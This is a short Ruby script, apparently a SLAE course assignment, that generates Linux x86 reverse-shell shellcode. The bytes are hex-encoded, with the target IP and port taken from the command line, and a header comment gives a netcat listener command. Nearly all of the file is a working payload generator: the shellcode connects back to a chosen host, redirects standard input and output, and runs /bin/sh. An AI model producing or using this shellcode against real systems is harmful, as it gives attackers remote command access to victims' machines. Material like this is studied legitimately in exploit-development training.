#!/usr/bin/ruby

# Filename: config_shell_reverse.rb
# Author: Matthew Spencer
# Usage: config_shell_reverse.rb [ip] [port]
# Description: SLAE Assignment 2. This produces shellcode for a reverse shell. Listening machine should run something like 'nc -l -p [port] -v'


NAME = "config_reverse_shell"
USAGE = "Usage: ./" + NAME + "[ip address] [port: 1-65535] \n"

if ARGV.length == 2
	ip = ARGV[0].split(".").map { |s| s.to_i.to_s(16).rjust(2, "0")}
	ipCode = "\\x" + ip[0] + "\\x" + ip[1] +"\\x" + ip[2] + "\\x" + ip[3]  
	port = ARGV[1].to_i.to_s(16).rjust(4, "0")
	portCode = "\\x" + port[0,2] + "\\x" + port[2,2]
	
	#\\xc0\\xa8\\x9e\\x89 	192.168.158.137
	#\\x11\\x5c		4444

	shellCode = "\"\\x31\\xc0\\x31\\xdb\\x50\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xb3\\x01\\xcd\\x80\\x5f\\x97\\x31\\xc0\\x68" + ipCode + "\\x66\\x68" + portCode + "\\x66\\x6a\\x02\\x89\\xe1\\x31\\xc0\\x6a\\x10\\x51\\x57\\x89\\xe1\\xb0\\x66\\xb3\\x03\\xcd\\x80\\xb0\\x3f\\x31\\xc9\\xcd\\x80\\xb0\\x3f\\xfe\\xc1\\xcd\\x80\\xb0\\x3f\\xfe\\xc1\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\"";
	puts shellCode
else
	puts USAGE
end
